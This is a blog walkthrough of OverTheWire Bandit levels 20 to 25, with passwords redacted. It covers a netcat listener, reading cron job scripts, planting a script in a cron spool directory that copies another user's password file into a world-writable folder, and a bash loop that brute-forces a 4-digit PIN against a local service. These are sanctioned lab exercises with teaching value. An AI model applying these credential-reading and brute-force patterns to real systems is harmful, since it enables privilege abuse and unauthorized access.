---
title: "Bandit | Levels 21-25 | Automation & Scheduling"
date: 2026-03-29T16:47:30+02:00
lastmod: 2026-03-29T16:47:30+02:00
description: "Walkthrough of Levels 21–25 in the OverTheWire Bandit wargame. Learn how to read cron jobs, reverse-engineer shell scripts, write your own scripts, and brute-force a 4-digit PIN with a bash loop."
summary: "Walkthrough of Levels 21–25 in the OverTheWire Bandit wargame. Learn how to read cron jobs, reverse-engineer shell scripts, write your own scripts, and brute-force a 4-digit PIN with a bash loop."
categories: ["WarGames", "OverTheWire", "Linux"]
series: ["OverTheWire - Bandit"] # If you write several articles on the same subject
seriesOrder: 5
showSummary: true
showTableOfContents: true
showTaxonomies: true
showReadingTime: true
showWordCount: false
showDate: true
draft: false
---


# Introduction

Levels 21 through 25 are about automation, scheduled tasks, shell scripts, and brute force. Cron jobs are one of the most common persistence mechanisms used by attackers, and understanding how to read and trace them is an essential blue team skill. This section also introduces writing your first shell script, a milestone worth noting.

---

## Level 20 -> 21

**Level Goal**

> A setuid binary connects to a port you specify, reads a line, and compares it to the current level's password. If correct, it sends the next password.

**Solution**

```
[greycipher@remnant ~]$ ssh bandit20@bandit.labs.overthewire.org -p 2220
```

This requires two simultaneous connections. Use `&` to run the
listener in the background:

```
bandit20@bandit:~$ echo "[REDACTED]" | nc -lp 4444 &
[1] 12345

bandit20@bandit:~$ ./suconnect 4444
Read: [REDACTED]
Password matches, sending next password
[REDACTED]
```

**Notes**

- `nc -lp 4444` starts netcat in listen mode on port 4444
- `&` sends the process to the background so you can keep using the terminal
- The binary connects to your listener, reads the password you sent, verifies it, and responds with the next one
- This pattern — setting up a listener and triggering a connection to it — is fundamental to understanding reverse shells and callback-based malware behaviour

---

## Level 21 -> 22

**Level Goal**

> A program is running automatically at regular intervals from cron. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**Solution**

```
[greycipher@remnant ~]$ ssh bandit21@bandit.labs.overthewire.org -p 2220
```

```
bandit21@bandit:~$ ls /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
[REDACTED]
```

**Notes**

Cron is the Linux task scheduler. The five `* * * * *` fields represent minute, hour, day of month, month, and day of week, all stars means "run every minute". The script writes the password to a world-readable temp file every minute. In a real environment, cron jobs writing sensitive data to `/tmp` would be a finding worth reporting.

---

## Level 22 -> 23

**Level Goal**

> A program is running automatically at regular intervals from cron. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**Solution**

```
[greycipher@remnant ~]$ ssh bandit22@bandit.labs.overthewire.org -p 2220
```

```
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null

bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

The script runs as `bandit23` and writes its password to `/tmp/<md5 hash>`. Reproduce the hash manually:

```
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349

bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
[REDACTED]
```

**Notes**

This level teaches script analysis, reading someone else's code and understanding what it does well enough to reproduce its output. The key insight is that `whoami` returns the user running the script, so substituting `bandit23` manually lets you predict where the file will be written. This kind of static analysis of scheduled scripts is exactly what you do when investigating persistence mechanisms on a compromised host.

---

## Level 23 -> 24

**Level Goal**

> A cron job runs scripts from a directory. Write your own script, place it there, and have it copy the password for you.

**Solution**

```
[greycipher@remnant ~]$ ssh bandit23@bandit.labs.overthewire.org -p 2220
```

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

The cron job executes any script in `/var/spool/bandit24/foo` owned by `bandit23`. Create a directory for the output, write the script, and wait for cron to run it:

```
bandit23@bandit:~$ mkdir /tmp/myoutput
bandit23@bandit:~$ chmod 777 /tmp/myoutput

bandit23@bandit:~$ nano /var/spool/bandit24/foo/getpass.sh
```

Script contents:

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/myoutput/password
```

```
bandit23@bandit:~$ chmod +x /var/spool/bandit24/foo/getpass.sh
```

Wait up to one minute for cron to execute it, then read the output:

```
bandit23@bandit:~$ cat /tmp/myoutput/password
[REDACTED]
```

**Notes**

This is the first level that requires writing your own shell script. The key points are making the output directory world-writable (`777`) so `bandit24` can write to it, and making the script executable (`+x`) so cron can run it. The script gets deleted after execution, so keep a copy if you need to rerun it.

---

## Level 24 -> 25

**Level Goal**

> A daemon on port 30002 requires the current password and a secret 4-digit PIN. Brute-force all 10000 combinations.

**Solution**

```
[greycipher@remnant ~]$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Write a script to generate all combinations and send them:

```
bandit24@bandit:~$ mktemp -d
/tmp/tmp.brute123

bandit24@bandit:~$ nano /tmp/tmp.brute123/brute.sh
```

Script contents:

```
#!/bin/bash
password="[REDACTED]"
for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done | nc localhost 30002 | grep -v "Wrong"
```

```
bandit24@bandit:~$ chmod +x /tmp/tmp.brute123/brute.sh
bandit24@bandit:~$ /tmp/tmp.brute123/brute.sh
Correct!
The password of bandit25 is: [REDACTED]
```

**Notes**

- `seq -w 0000 9999` generates zero-padded numbers from 0000 to 9999
- All combinations are piped to a single `nc` connection rather than opening a new connection per attempt — the level hint says this is intentional and required
- `grep -v "Wrong"` filters out incorrect attempt responses so only the success message is shown
- This is a controlled brute force exercise — the same pattern (generate wordlist, pipe to service, filter output) appears in real-world credential stuffing and PIN brute force scenarios
